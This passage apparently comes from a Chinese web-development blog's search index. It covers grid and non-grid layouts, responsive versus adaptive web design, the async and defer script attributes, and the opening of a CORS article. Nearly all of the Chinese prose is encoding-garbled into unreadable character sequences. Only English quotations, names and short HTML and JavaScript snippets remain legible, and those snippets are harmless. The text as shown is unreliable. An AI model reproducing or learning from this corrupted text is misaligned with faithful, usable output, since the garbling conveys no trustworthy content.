å¯ä»¥å°ç…§è‘—ä¸Šé¢çš„åœ–ä¾†çœ‹ï¼Œæ‡‰è©²æœƒæ¯”è¼ƒå¥½ç†è§£ã€‚ æ‰€ä»¥è¦æ€éº¼åšå‡ºç¶²æ ¼å‘¢ï¼Ÿæ ¹æ“šç›®å‰æˆ‘æ‰€çŸ¥é“ï¼Œä½ å¯ä»¥ç”¨ä»¥ä¸‹çš„æ–¹å¼ï¼š ä½¿ç”¨ CSS ä¸­çš„ grid å±¬æ€§ ä½¿ç”¨ç¾æˆçš„ç¶²æ ¼æ¡†æ¶ï¼ˆä¾‹å¦‚ï¼š960 grid systemï¼‰ å¦‚æœä½ å°gridæœ‰èˆˆè¶£çš„è©±ï¼Œå¯ä»¥åœ¨è‡ªè¡Œæœç´¢ä¸€äº›ç›¸é—œè³‡è¨Šï¼Œä¸éé€™é‚Šç‚ºäº†æ–¹ä¾¿èµ·è¦‹ï¼Œæ˜¯ä½¿ç”¨ç¾æˆçš„æ¡†æ¶ä¾†åšç¤ºç¯„ã€‚ Codepenï¼š See the Pen æ ¼ç·šå¼ç‰ˆé¢ by jim (@jubeatt) on CodePen. çµ¦èŒæ–°çš„ä¸€äº›å°æé†’ç¤ºç¯„ä¸­æ˜¯ä½¿ç”¨ 960 grid system é€™å€‹æ¡†æ¶ä¾†æ“ä½œï¼Œæ‰€ä»¥å¯èƒ½å°æ–¼ç¬¬ä¸€æ¬¡æ¥è§¸æ¡†æ¶çš„äººæœƒçœ‹ä¸æ‡‚æˆ‘åœ¨å¯«ä»€éº¼ã€‚ä½†åˆ¥æ“”å¿ƒï¼Œå…¶å¯¦é€™ä¸€æ¨£æ˜¯ç”¨ä¸Šé¢æ‰€èªªçš„è¦å‰‡åœ¨æ“ä½œçš„ï¼Œæ‰€ä»¥ä½ åªè¦å…ˆç†è§£ä¸Šé¢çš„æ„æ€ï¼Œä¹‹å¾Œå†æ…¢æ…¢å»è£œé€™æ–¹é¢çš„ç›¸é—œçŸ¥è­˜å³å¯ã€‚ ç„¡æ ¼ç·šå¼ç‰ˆé¢ å¾ˆæ˜é¡¯å°±æ˜¯ä¸€å€‹ç§€æŠ€è¡“çš„ç‰ˆé¢ï¼ é€™ç¨®ç‰ˆå‹çš„æ¦‚å¿µæ˜¯æŠŠæ•´å€‹é é¢ç•¶ä½œæ˜¯ä¸€å€‹ ã€Œç•«å¸ƒã€ï¼Œä½ æƒ³æ”¾ä»€éº¼ï¼Ÿæ”¾åœ¨å“ªè£¡ï¼Ÿéƒ½ä»»å›æŒ‘é¸ã€‚è¦å¯¦ç¾é€™å€‹ç‰ˆé¢ï¼ŒåŸºæœ¬ä¸Šæœƒéœ€è¦ä¾è³´å¤§é‡çš„ position å±¬æ€§ä¾†é”æˆã€‚ é›–ç„¶çœ‹èµ·ä¾†å¾ˆé…·ç‚«ï¼Œä¸éé™¤éä½ æœ‰è¿½æ±‚è¦–è¦ºæ•ˆæœçš„ç‰¹æ®Šéœ€æ±‚ï¼Œå¦å‰‡æˆ‘å€‹äººä¸æ¨è–¦ä½¿ç”¨é€™ç¨®ç‰ˆå‹ã€‚ å¯¦ç”¨åº¦æ¯”è¼ƒä½ è€ƒæ…®åˆ°éŸ¿æ‡‰å¼èˆ‡ç›¸å®¹æ€§çš„å•é¡Œæ™‚ï¼Œæ•´å€‹ CSS ä¹Ÿæœƒè®Šå¾—ç›¸å°è¤‡é›œè¨±å¤šã€‚ æ›å¥è©±èªªï¼Œé™¤éä½ æœ‰å¾ˆé«˜è¶…çš„æŠ€è¡“ï¼Œä¸ç„¶é€™ä¸æ˜¯ä½ è©²éš¨ä¾¿äº‚ç¢°çš„ç‰ˆå‹ã€‚ï¼ˆä¸è¦ç©ç‰ˆå‹ï¼‰ Codepenï¼š See the Pen ç„¡æ ¼ç·šå¼ç‰ˆé¢ by jim (@jubeatt) on CodePen. ï¼ˆä»–å¥½åƒæ°¸é å°è‘—ä½ ç¬‘ï¼Œç¬‘å¾—ä½ å¿ƒè£¡ç™¼å¯’ã€‚ï¼‰ è¤‡åˆå¼ç‰ˆé¢ä¸»è§’ç¸½æ˜¯åˆ°æœ€å¾Œæ‰ç™»å ´ã€‚æ²’æœ‰éŒ¯ï¼Œé€™ç¯‡æ–‡ç« çš„é‡é»å°±åœ¨æ–¼é€™å€‹éƒ¨åˆ†äº†ã€‚ ç²—ç•¥ä¸€é»ä¾†èªªï¼Œå°±æ˜¯æˆ‘å€‘å¾ˆå¸¸è½åˆ°çš„çš„éŸ¿æ‡‰å¼ç‰ˆé¢ã€‚ä¸éå¦‚æœä½ ä¸Šç¶²æŸ¥è©¢ä¸€äº›ç›¸é—œè³‡æ–™çš„è©±ï¼Œæœƒç™¼ç¾éŸ¿æ‡‰å¼å¤§è‡´ä¸Šå¯ä»¥åœ¨åˆ†æˆä»¥ä¸‹å…©ç¨®ï¼š éŸ¿æ‡‰å¼ç‰ˆé¢ï¼ˆResponse Web Designï¼Œä»¥ä¸‹ç°¡ç¨± RWDï¼‰ é©æ‡‰å¼ç‰ˆé¢ï¼ˆAdaptive Web Designï¼Œä»¥ä¸‹ç°¡ç¨± AWDï¼‰ ç™¾èŠ±é½Šæ”¾ï¼Œç™¾å®¶çˆ­é³´ã€‚ å°æ–¼é€™å…©ç¨®ç‰ˆé¢çš„å¯¦éš›å·®ç•°ï¼Œæ¯å€‹äººæœ‰ä¸åŒçš„çœ‹æ³•ï¼Œæ‰€ä»¥æˆ‘é€™è£¡æœƒç”¨æˆ‘è‡ªå·±çš„æƒ³æ³•ä¾†è§£é‡‹ã€‚ ä»€éº¼æ˜¯éŸ¿æ‡‰å¼ç¶²é ï¼ˆResponse Web Designï¼‰ï¼ŸéŸ¿æ‡‰å¼ç¶²é æœ€åˆæ˜¯ç”± â€œEthan Marcotteâ€ åœ¨A List Apart 2010 å¹´ 5 æœˆçš„ä¸€ç¯‡æ–‡ç« ä¸­æå‡ºçš„ä¸€ç¨®æƒ³æ³•ã€‚ï¼ˆé€™è£¡åªæœƒå¤§ç•¥çš„è¬›ä¸€äº›å¤§æ„ï¼Œæœ‰èˆˆè¶£çš„äººå¯ä»¥é»é€²å»çœ‹æ›´å®Œæ•´çš„å…§å®¹ã€‚ï¼‰ ä½œè€…é¦–å…ˆåœ¨æ–‡ç« ä¸­é»å‡ºäº†ç•¶æ™‚ç¶²é è¨­è¨ˆä½ˆå±€æ‰€é¢è‡¨åˆ°çš„å•é¡Œï¼š Can we really continue to commit to supporting each new user agent with its own bespoke experience? At some point, this starts to feel like a zero sum game. But how can weâ€”and our designsâ€”adapt? æˆ‘å€‘çœŸçš„è¦æŒçºŒçš„ç‚ºæ¯ä¸€å€‹æ–°çš„ä½¿ç”¨è€…å®¢è£½åŒ–ä¸€å¥—å°ˆå±¬æ–¼ä»–å€‘çš„é«”é©—å—ï¼Ÿå¾æŸäº›é»ä¾†èªªï¼Œé€™é–‹å§‹è®“äººæ„Ÿè¦ºåƒæ˜¯å ´æ°¸é é€šä¸äº†é—œçš„éŠæˆ²ã€‚ä½†æ˜¯æˆ‘å€‘åˆè¦å¦‚ä½•è®“ç¶²é è¨­è¨ˆèƒ½å¤ åšåˆ° â€œé©æ‡‰â€ é€™ä»¶äº‹ï¼Ÿ éš¨è‘—å„å¼å„æ¨£çš„è£ç½®èª•ç”Ÿï¼Œæˆ‘å€‘ä¸èƒ½æ°¸é åœç•™åœ¨éå»çš„æ€ç¶­ï¼Œç‚ºæ¯ä¸€å€‹è£ç½®ä¾†è¨­è¨ˆå°ˆå±¬çš„ç¶²é ä½ˆå±€ã€‚è€Œæ˜¯è¦è½‰è®Šæˆã€Œèƒ½å¤ éŸ¿æ‡‰åˆ°æ¯å€‹è£ç½®ã€çš„é€™ç¨®è¨­è¨ˆæ€ç¶­ã€‚ ç‚ºäº†å¯¦ç¾é€™å€‹ç†å¿µï¼Œä½œè€…å°±å’Œæˆ‘å€‘å‰é¢æ‰€è¬›çš„ä¸€æ¨£ï¼Œè®“ç¶²é çš„å€å¡Šè®Šæˆæ˜¯ã€Œæµå‹•çš„ã€ï¼Œé€™æ¨£ç¢ºå¯¦å°±èƒ½å¤ åšå‡ºå…·æœ‰å½ˆæ€§çš„ä½ˆå±€ã€‚ ä½†å„˜ç®¡å¦‚æ­¤ï¼Œè¦çœŸæ­£å¯¦ç¾éŸ¿æ‡‰å¼é€™å€‹æƒ³æ³•é‚„æ˜¯ä¸å¤ çš„ã€‚å¦‚æœæˆ‘å€‘åªæ˜¯å–®ç´”çš„è®“æ¯å€‹å€å¡Šè®Šæˆæ˜¯æµå‹•çš„ï¼Œé‚„æ˜¯æœƒå¼•ç™¼ä¸€äº›å•é¡Œã€‚ï¼ˆè­¬å¦‚èªªï¼šè§£æåº¦ç‰¹å¤§æˆ–ç‰¹å°çš„è£ç½®ï¼‰ ç‚ºæ­¤ï¼Œmedia queriesçš„å­˜åœ¨å°±å¾ˆé‡è¦äº†ã€‚ media querieså¯ä»¥åšåˆ°æˆ‘å€‘åŸæœ¬åšä¸åˆ°çš„äº‹ï¼Œåƒæ˜¯ï¼š åœ¨è¦–çª—å¯¬åº¦å°æ–¼ xxx æ™‚â€¦ (min-width) åœ¨æ‰‹æ©Ÿç•«é¢é¡¯ç¤ºç‚º xxx æ™‚â€¦ (orientation: landscape) é¡¯ç¤ºå€åŸŸçš„é•·å¯¬æ¯”ç‚º xxx æ™‚ (aspect-ratio) è¢å¹•çš„é•·å¯¬æ¯”ç‚º xxx æ™‚ (device-aspect-ratio) ç•«é¢çš„åƒç´ å¯†åº¦ç‚º xxx æ™‚ (resolution) æ‰€ä»¥åªè¦èƒ½å¤ å–„ç”¨media queriesï¼ŒåŸºæœ¬ä¸Šå°±èƒ½å¯¦ç¾éŸ¿æ‡‰å¼é€™å€‹æ¦‚å¿µã€‚ é€™ä¹Ÿæ˜¯ç‚ºä»€éº¼æ¯ç•¶æåˆ°éŸ¿æ‡‰å¼ï¼Œå°±æœƒè·Ÿmedia queriesæ‰¯ä¸Šé—œä¿‚çš„åŸå› ã€‚ é‚£ä»€éº¼åˆæ˜¯é©æ‡‰å¼ç¶²é ï¼Ÿï¼ˆAdaptive Web Designï¼‰é©æ‡‰å¼ç¶²é æ˜¯å¾ 2011 å¹´ â€œAaron Gustafsonâ€ åœ¨ä»–çš„è‘—ä½œ Adaptive Web Design: Crafting Rich Experiences With Progressive Enhancement æå‡ºçš„å¦å¤–ä¸€ç¨®æ€ç¶­ã€‚ æ‰€ä»¥å°±æ™‚é–“é»ä¾†èªªï¼Œ AWD æ˜¯åœ¨ RWD å‡ºç¾ä¸€æ®µæ™‚é–“å¾Œï¼Œ æ‰è¢«æå‡ºçš„ä¸€ç¨®è¨­è¨ˆæ€ç¶­ã€‚é€™ä¹Ÿæš—ç¤ºäº† RWD æ‰€é­é‡çš„ä¸€äº›å•é¡Œã€‚ ä½ å¯ä»¥æƒ³æƒ³çœ‹ï¼Œå¦‚æœ RWD æ˜¯ä»¥ã€Œåœ¨æ¯å€‹è£ç½®éƒ½é¡¯ç¤ºç›¸åŒçš„å…§å®¹ã€ç‚ºå‰æä¾†è¨­è¨ˆçš„ï¼Œé‚£ç¾åœ¨å‡è¨­æœ‰å€‹ç¶²é çš„å…§å®¹éå¸¸å¤šï¼Œè€Œä¸”æœ‰å¤§ç­†çš„è³‡æ–™è¦è¼‰å…¥æ™‚ï¼Œä½¿ç”¨æ‰‹æ©Ÿçš„äººå¯èƒ½æœƒç¢°åˆ°ä»€éº¼å•é¡Œï¼Ÿä½ ç¬¬ä¸€å€‹æœƒç›´è¦ºæƒ³åˆ°çš„å¯èƒ½æ˜¯è¼‰å…¥é€Ÿåº¦ï¼Œå…¶æ¬¡ç‚º ä½¿ç”¨è€…é«”é©—(UX) ï¼Œè€Œé€™ä¹Ÿæ˜¯æœ€ä¸»è¦çš„å…©å€‹å•é¡Œã€‚ ç‚ºäº†æ”¹å–„é€™å€‹å•é¡Œï¼ŒAWD çš„æƒ³æ³•å°±æµ®ç¾å‡ºä¾†äº†ã€‚æ‰€ä»¥é€™è£¡ç°¡å–®çš„ä»‹ç´¹ä¸€ä¸‹ï¼ŒAWD åˆ°åº•æ˜¯ä»€éº¼ï¼Ÿ é¦–å…ˆ AWD çš„è¨­è¨ˆæ€ç¶­æ˜¯ï¼Œé å…ˆå°æ¯å€‹è£ç½®è¨­å®šå¥½ æ–·é»(breakpoint) ã€‚è­¬å¦‚æœ€ä¸»æµçš„å…­å€‹ï¼š320, 480, 760, 960, 1200 1600 (pixels)æ¥è‘—åœ¨ç‚ºæ¯ä¸€å€‹æ–·é»ä¾†è¨­è¨ˆå°ˆå±¬çš„ å›ºå®šå°ºå¯¸ï¼ˆä¾‹å¦‚ï¼špxï¼‰ é é¢ã€‚ æ‰€ä»¥ç°¡å–®ä¾†èªªï¼Œæ¯ä¸€å€‹è£ç½®éƒ½æœƒæœ‰ä¸€å€‹å°ˆå±¬è‡ªå·±çš„ä½ˆå±€ã€‚æ¯ç•¶è¼‰å…¥é€™å€‹ç¶²é æ™‚ï¼Œç¶²é ä¼ºæœå™¨å°±æœƒå»åµæ¸¬è£ç½®ï¼Œä¸¦ä¸”å›æ‡‰ä¸€å€‹æœ€é©åˆé€™å€‹è£ç½®çš„é é¢çµ¦å®ƒã€‚ è¦æ€éº¼å€åˆ†ä¸€å€‹ç¶²ç«™æ˜¯ RWD é‚„æ˜¯ AWDï¼Ÿ å…¶å¯¦å¾ˆç°¡å–®ï¼Œå› ç‚ºä¸ä¹…å‰æˆ‘å€‘èªªé AWD çš„ç¶²é ä½ˆå±€æ˜¯æ¡ç”¨ ã€Œå›ºå®šå°ºå¯¸ã€ã€‚æ‰€ä»¥ä½ åªè¦è©¦è‘—å»èª¿æ•´ç€è¦½å™¨çš„è¦–çª—ï¼Œçœ‹çœ‹ç•«é¢æ˜¯å¦æœƒæœ‰æµå‹•ï¼ˆä¼¸ç¸®ï¼‰çš„åæ‡‰å°±å¯ä»¥åˆ¤æ–·ã€‚ å¦‚æœæœ‰ä¼¸ç¸®çš„æ•ˆæœ â†’ RWD å¦‚æœæ²’æœ‰ä¼¸ç¸®çš„æ•ˆæœ â†’ AWD ç‚ºäº†æ–¹ä¾¿ç†è§£ï¼Œé€™è£¡ä¹Ÿæä¾›äº†ä¸€äº›ç¯„ä¾‹çµ¦å„ä½ï¼š Amazon å·´å“ˆå§†ç‰¹ USA TODAY åŒæ¨£çš„ç¶²ç«™ï¼Œä½ ç”¨æ‰‹æ©Ÿè·Ÿé›»è…¦é»é€²å»ï¼Œæœƒå¾—åˆ°ä¸ä¸€æ¨£çš„çµæœã€‚é™¤äº†æ•´é«”çš„æ’ç‰ˆæ˜é¡¯ä¸åŒä¹‹å¤–ï¼Œå…§å®¹ä¸Šä¹Ÿä¸å¤ªä¸€æ¨£ã€‚ä¸çŸ¥é“ä½ æœ‰æ²’æœ‰ä¸€ç¨®å›åˆ°éå»æ‰‹æ©Ÿç‰ˆã€é›»è…¦ç‰ˆçš„æ—¢è¦–æ„Ÿï¼Œä¸éé€™ä¸¦ä¸æ˜¯ï¼Œé€™æ˜¯ AWDã€‚ï¼ˆå¦‚æœæ˜¯æ‰‹æ©Ÿæ¿ï¼Œç¶²å€é€šå¸¸æœƒæœ‰ä¸€å€‹å‰å¢œå­— mï¼‰ é€™è£¡æˆ‘ä¹Ÿç•«äº†åœ–ä¾†è®“å¤§å®¶æ›´å¥½ç†è§£é€™å€‹æ¦‚å¿µï¼š æˆ–è€…ä½ ä¹Ÿèƒ½åƒè€ƒé€™å¼µåœ–ï¼š é™¤äº†ä»¥ä¸Šé€™äº›ä»¥å¤–ï¼Œä¸ç®¡æ˜¯ RWDï¼Œé‚„æ˜¯ AWDï¼Œåˆæˆ–æ˜¯ RWD èˆ‡ AWD ä¹‹é–“çš„å·®ç•°ã€‚å…¶å¯¦éƒ½é‚„æœ‰å¾ˆå¤šå¯ä»¥æ¢è¨çš„ç´°ç¯€ï¼Œä½†å¦‚æœè¦å…¨éƒ¨è¬›å®Œçš„è©±ï¼Œé€™ç¯‡æ–‡ç« å¯èƒ½æœƒéå¸¸éå¸¸çš„é•·ï½æ‰€ä»¥ç›®å‰å°±å…ˆé»åˆ°é€™è£¡ï¼Œå¸Œæœ›ä½ èƒ½å°é€™å…©å€‹æ±è¥¿éƒ½èƒ½æœ‰ä¸€äº›æ¦‚å¿µå°±å¥½äº†ï¼é€™è£¡ä¹Ÿåšä¸€å€‹ç°¡å–®çš„æ•´ç†ã€‚ éŸ¿æ‡‰å¼(RWD) é©æ‡‰å¼(AWD) ç”±ç€è¦½å™¨æ±ºå®šé é¢ï¼ˆç”¨æˆ¶ç«¯ï¼‰ ç”±ä¼ºæœå™¨æ±ºå®šå›å‚³é é¢ï¼ˆä¼ºæœå™¨ç«¯ï¼‰ æµå‹•å€å¡Š å›ºå®šå€å¡Š éš¨å¯¬åº¦æ”¹è®Šåšèª¿æ•´ è¼‰å…¥æ™‚åµæ¸¬ä¸¦å›å‚³å°æ‡‰ç¶²é  ç©©å®šæ€§è¼ƒå·®ï¼ˆä¸€å€‹æ› = å…¨æ›ï¼‰ ç©©å®šæ€§è¼ƒé«˜ï¼ˆå„ç¨®è£ç½®çš„ç¶²é é–“äº’ä¸å½±éŸ¿ï¼‰ ä¸å…·æœ‰ç‰¹å¾µåµæ¸¬åŠŸèƒ½ å…·æœ‰ç‰¹å¾µåµæ¸¬åŠŸèƒ½ ï¼ˆåˆ©æ–¼å•†æ¥­å»£å‘Šï¼‰ æ‰€æœ‰è£ç½®æ¡ç”¨ä¸€ç¨®ä½ˆå±€ ä¸€å€‹è£ç½®ä¸€ç¨®ä½ˆå±€ æ¥å—ç›¸åŒç¶²é çš„è³‡æ–™ æ ¹æ“šå›å‚³é é¢æ±ºå®šè³‡æ–™é‡ è¼‰å…¥æ•ˆèƒ½è¼ƒå·® è¼‰å…¥æ•ˆèƒ½è¼ƒå„ª è¨­è¨ˆç¯„åœè¼ƒå—ä¾·é™ å¯å°è£ç½®å®¢è£½åŒ– æˆæœ¬ä½ã€è¼ƒç°¡æ˜“ã€å¿«é€Ÿ è£½ä½œæˆæœ¬é«˜ã€è€—æ™‚ã€è¤‡é›œ è‡³æ–¼å…¶æ–¼çš„éƒ¨åˆ†ï¼Œå°±ç•™çµ¦å„ä½å»è‡ªè¡Œæ¢è¨äº†ã€‚ å¯¦ä½œéŸ¿æ‡‰å¼ç‰ˆé¢ See the Pen éŸ¿æ‡‰å¼ç‰ˆé¢(flex) by jim (@jubeatt) on CodePen. é€™è£¡ä½¿ç”¨ flex å¯¦ä½œï¼Œæˆ‘å€‹äººèªç‚ºä»¥é€™å€‹ç¯„ä¾‹ä¾†èªªï¼Œ flex æœƒæ¯”è¼ƒå®¹æ˜“é”æˆï¼Œä¹Ÿæ¯”è¼ƒå¥½ç†è§£ã€‚ç•¶ç„¶ï¼Œå¦‚æœä½ æƒ³çœ‹floatç‰ˆæœ¬ï¼Œå¯ä»¥åƒè€ƒé€™è£¡ å¯¦ä½œé©æ‡‰å¼ç‰ˆé¢ See the Pen é©æ‡‰å¼ç‰ˆé¢ by jim (@jubeatt) on CodePen. æ³¨æ„ï¼š é€™è£¡åªæ˜¯åšä¸€å€‹æ¼”ç¤ºï¼Œä¸»è¦æ˜¯å‘ˆç¾ã€Œå›ºå®šç‰ˆé¢ã€çš„æ•ˆæœã€‚ å¯¦éš›ä¸Š AWD ä¸¦ä¸æ˜¯é€™å€‹æ¨£å­å“¦ï¼Œæ“šæˆ‘æ‰€çŸ¥ï¼Œé™¤äº†æ­é…mediq queriesä»¥å¤–ï¼ŒçœŸæ­£çš„ AWD é‚„éœ€è¦æ­é…ä¸€ç³»åˆ—çš„ JavaScript æ“ä½œä¾†é”æˆã€‚ï¼ˆè‹¥æœ‰èªªéŒ¯è«‹åœ¨ç³¾æ­£æˆ‘ï¼‰ æ‰€ä»¥é€™è£¡çš„ç¯„ä¾‹åƒ…ä¾›åƒè€ƒï¼Œè«‹ä¸è¦ç•¶æˆæ˜¯çœŸçš„ AWD å“¦ï¼ æ–‡æœ«æˆ‘æƒ³åœ¨é€™å€‹æ»¿å¤§è¡—éƒ½æ˜¯éŸ¿æ‡‰å¼çš„æ™‚ä»£ï¼ŒéŸ¿æ‡‰å¼è¨­è¨ˆæ˜¯ä¸€å€‹å‰ç«¯å·¥ç¨‹å¸«ä¸å¾—ä¸å­¸ç¿’çš„ä¸€é …æŠ€èƒ½ã€‚å„˜ç®¡ç¾åœ¨æœ‰å„ç¨®æ¡†æ¶ï¼Œä½†å†æ–¹ä¾¿çš„æ¡†æ¶çµ‚ç©¶é‚„æ˜¯æœƒæœ‰å®ƒçš„é™åˆ¶èˆ‡æ¥µé™ã€‚æ‰€ä»¥æœ‰äº›æ™‚å€™ï¼Œæˆ‘å€‘é‚„æ˜¯å¾—å…·å‚™ä¸€äº›æ‰‹åˆ»çš„èƒ½åŠ›ã€‚ éŸ¿æ‡‰å¼è¨­è¨ˆçœ‹ä¼¼è¤‡é›œï¼Œä½†å®ƒå…¶å¯¦ä¹Ÿæ˜¯å¾æœ€é–‹å§‹çš„å›ºå®šç‰ˆé¢ï¼Œä¸€æ­¥ä¸€æ­¥æ¼”åŒ–éä¾†çš„ç”¢ç‰©ã€‚æˆ‘èªç‚ºéŸ¿æ‡‰å¼çš„èƒŒå¾Œå…¶å¯¦å°±æ˜¯æŠŠé€™äº›å„å¼å„æ¨£çš„ç‰ˆå‹ï¼Œä¸€å€‹å€‹å †ç–Šèµ·ä¾†çš„ä¸€ç¨®ç‰ˆå‹ã€‚ èº«ç‚ºä¸€å€‹å­¸ç¿’ CSS ç´„å…©å¹´å¤šçš„äººï¼Œæˆ‘ç›¸ä¿¡è©¦è‘—å»ç†è§£é€™äº›æ±è¥¿ï¼Œæ‡‰è©²æœƒå°ä½ åœ¨è¨­è¨ˆç‰ˆé¢èƒ½æœ‰ä¸€äº›å¹«åŠ©ã€‚ç•¶ç„¶ï¼Œé€™ç¯‡æ–‡ç« ä¹Ÿè¨±æœ‰å¾ˆå¤šè©²æçš„æ±è¥¿æ²’æœ‰æåˆ°ï¼Œé€™æ˜¯å› ç‚ºä¸å¸Œæœ›å¼„å¾—å¤ªè¤‡é›œï¼Œæ‰€ä»¥æ‰ç°¡åŒ–äº†ä¸å°‘å…§å®¹ã€‚å¦‚æœä½ ç™¼ç¾æ–‡ä¸­æœ‰éŒ¯èª¤çš„åœ°æ–¹ï¼Œæˆ–æ˜¯ä½ æœ‰å…¶ä»–çš„ç–‘å•æˆ–å»ºè­°ï¼Œéƒ½æ­¡è¿ä½ å¯„ä¿¡çµ¦æˆ‘ã€‚ä½ çš„å›æ‡‰ï¼Œå°æˆ‘è€Œè¨€å°±æ˜¯æœ€å¤§çš„æ”¯æŒã€‚ æœ€å¾Œï¼Œéå¸¸è¬è¬çœ‹å®Œé€™ç¯‡æ–‡ç« çš„å„ä½ï¼ åƒè€ƒè³‡æ–™STUDIO_by_UXPininteraction-designmeebox_blogiki0723_blogThe Beginnerâ€™s Guide to Adaptive Web Design960 grid sysyemHTML5 â€§ CSS3 æœ€å¼·åœ–è§£å¯¦æˆ°è¬›åº§HTML and CSS : Design and Build Websites","link":"/2021/07/19/layout-types/"},{"title":"èªè­˜ <script> ä¸­çš„ async èˆ‡ defer å±¬æ€§","text":"å¶ç„¶é–“å­¸åˆ°çš„ï¼Œæ‰€ä»¥ç´€éŒ„ä¸€ä¸‹ã€‚ æ‡¶äººåŒ…æé†’ï¼šé€™å…©å€‹å±¬æ€§éƒ½æ˜¯åŸºæ–¼ src å¼•å…¥å¤–éƒ¨è³‡æºç”¨çš„ï¼Œå¦‚æœæ˜¯ inline script çš„è©±æ²’æœ‰ä»»ä½•ä½œç”¨ã€‚ é¦–å…ˆè§£é‡‹ä¸€ä¸‹åœ¨æ²’æœ‰ async è·Ÿ defer æ™‚çš„æµç¨‹ï¼š åœæ­¢è§£æ æ ¹æ“šè·¯å¾‘ç™¼ request ç­‰å¾… response æ‹¿åˆ° response å¾Œï¼ŒåŸ·è¡Œè…³æœ¬å…§å®¹ åŸ·è¡Œå®Œç•¢ï¼Œç¹¼çºŒå‘ä¸‹è§£æ asyncä¸€çœ‹åå­—å°±çŸ¥é“æ˜¯ç”¨ã€ŒéåŒæ­¥ã€ä¾†è¼‰å…¥å¤–éƒ¨è³‡æºï¼Œæ‰€ä»¥ä¸éœ€è¦ç­‰å¾… responseã€‚ é€™é‚Šèˆ‰å€‹ä¾‹å­ï¼š 1234567891011&lt;!-- index.html --&gt;&lt;!-- é€™é‚Šåœ¨ sever åšäº†ä¸€é»è¨­å®šï¼Œè¦ç­‰ 3 ç§’æ‰æœƒæ‹¿åˆ° response --&gt;&lt;script src=\"http://localhost:5000/\"&gt;&lt;/script&gt;&lt;button&gt;button&lt;/button&gt;&lt;script&gt; document.querySelector('button').addEventListener('click', () =&gt; { console.log('click') })&lt;/script&gt; å› ç‚ºä¸æ˜¯éåŒæ­¥ï¼Œæ‰€ä»¥åˆ° &lt;script src=\"http://localhost:5000/\"&gt;&lt;/script&gt; å°±è¦ç­‰ 3 ç§’ï¼Œå¾Œé¢çš„æ±è¥¿éƒ½ä¸æœƒè¢«åŸ·è¡Œã€‚ åŠ ä¸Š async å°±ä¸ä¸€æ¨£äº†ï¼š 123456789101112&lt;!-- index.html --&gt;&lt;!-- ä¸€æ¨£è¦ç­‰ 3 ç§’æ‰æœƒæ‹¿åˆ° responseï¼Œ ä½†ç¾åœ¨åŠ ä¸Š async å°±ä¸ç”¨åœ¨é€™è£¡ç­‰ --&gt;&lt;script src=\"http://localhost:5000/\" async&gt;&lt;/script&gt;&lt;button&gt;button&lt;/button&gt;&lt;script&gt; document.querySelector('button').addEventListener('click', () =&gt; { console.log('click') })&lt;/script&gt; é›–ç„¶æœƒè½‰åœˆåœˆä½†å…¶å¯¦ç€è¦½å™¨ä¸¦æ²’æœ‰ã€Œé˜»å¡ã€ã€‚ deferé¡§åæ€ç¾©å°±æ˜¯ã€Œå»¶é²ã€ï¼Œå»¶é²ä»€éº¼ï¼ŸæŠŠè…³æœ¬å»¶é²åˆ° DOM å…ƒç´ è¢«è§£æå®Œå¾Œå†åŸ·è¡Œã€‚ï¼ˆåš´è¬¹ä¾†èªªæ˜¯ DOMContentLoaded ä»¥å‰ï¼Œä½†æˆ‘è¦ºå¾—çŸ¥é“é€™æ¨£å°±å¤ äº†ï¼‰ å¦‚æœæ²’æœ‰å»¶é²ï¼Œä¸€ç¢°åˆ° &lt;script&gt; å°±æœƒç›´æ¥åŸ·è¡Œï¼Œé€™å€‹æ™‚å€™å¦‚æœ DOM é‚„æ²’è¢«è§£æä½ å°±æŠ“ä¸åˆ°å…ƒç´ ï¼š 12// getElement.jsconsole.log(document.querySelector('button')) 12345&lt;body&gt; &lt;!-- åˆ°é€™è¡Œå°±ç›´æ¥åŸ·è¡Œ --&gt; &lt;script src=\"./getElement.js\"&gt;&lt;/script&gt; &lt;button&gt;button&lt;/button&gt;&lt;/body&gt; åŠ ä¸Š defer å°±å¯ä»¥ç¢ºä¿ DOM å…ƒç´ è§£æå®Œæ‰åŸ·è¡Œï¼š 12345&lt;body&gt; &lt;!-- ç­‰åˆ° DOM è§£æå®Œæ‰åŸ·è¡Œ --&gt; &lt;script src=\"./getElement.js\" defer&gt;&lt;/script&gt; &lt;button&gt;button&lt;/button&gt;&lt;/body&gt; é‚£å…©å€‹ä¸€èµ·ç”¨ä»£è¡¨ä»€éº¼ï¼Ÿä¸ç”¨æƒ³å¤ªè¤‡é›œï¼Œå°±æ˜¯åŒæ™‚å¥—ç”¨å…©å€‹é‚è¼¯ï¼š ç”¨éåŒæ­¥å»ç™¼ requestï¼Œä¸è¦åœæ­¢è§£æ å¦‚æœæ‹¿åˆ°è³‡æ–™å¾Œ DOM é‚„æ²’è§£æå®Œï¼Œå°±ç­‰åˆ°è§£æå®Œå¾Œå†åŸ·è¡Œ æ‰€ä»¥ç°¡å–®ä¾†èªªï¼Œä¸€å€‹æ˜¯ç”¨ä¾†æ±ºå®šã€Œè¦ä¸è¦å…ˆåœæ­¢è§£æã€ï¼Œå¦ä¸€å€‹æ˜¯æ±ºå®šã€Œè¦ä»€éº¼æ™‚å€™æ‰åŸ·è¡Œè…³æœ¬ã€ã€‚","link":"/2022/02/12/learn-async-and-defer-attribute/"},{"title":"å¾éŠæˆ²ä¾†èªè­˜ CORS èˆ‡ç€è¦½å™¨çš„é™åˆ¶","text":"å¾ˆé‡è¦çš„è§€å¿µå“¦ï¼ å‰è¨€é€™ç¯‡æ–‡ç« ä¸»è¦æœƒæ‹¿ Lidemy HTTP Challenge é€™å€‹å°éŠæˆ²ä¾†åšèªªæ˜ï¼Œæ‰€ä»¥å»ºè­°ç©éä¹‹å¾Œå†ä¾†çœ‹ï¼Œä¸ç„¶å¯èƒ½æœƒçœ‹ä¸æ‡‚ã€‚ å¦å¤–æˆ‘ä¹Ÿå¯«äº†ä¸€ç¯‡æ”»ç•¥æ–‡ï¼šHTTP Challenge æ”»ç•¥èˆ‡å¿ƒå¾— ï¼Œæœ‰èˆˆè¶£å¯ä»¥åƒè€ƒçœ‹çœ‹ã€‚ é—œæ–¼ CROSCORS çš„å…¨åç‚ºã€ŒCross-Origin Resource Sharingï¼ˆè·¨ä¾†æºè³‡æºå…±ç”¨ï¼‰ã€ï¼Œæ˜¯ä¸€å€‹ã€Œç€è¦½å™¨ã€çš„è¦ç¯„ï¼Œç›®çš„æ˜¯è¦è®“æˆ‘å€‘å¯ä»¥ã€Œåˆ°ä¸åŒä¾†æºçš„åœ°æ–¹ã€å»æ‹¿è³‡æ–™ã€‚ 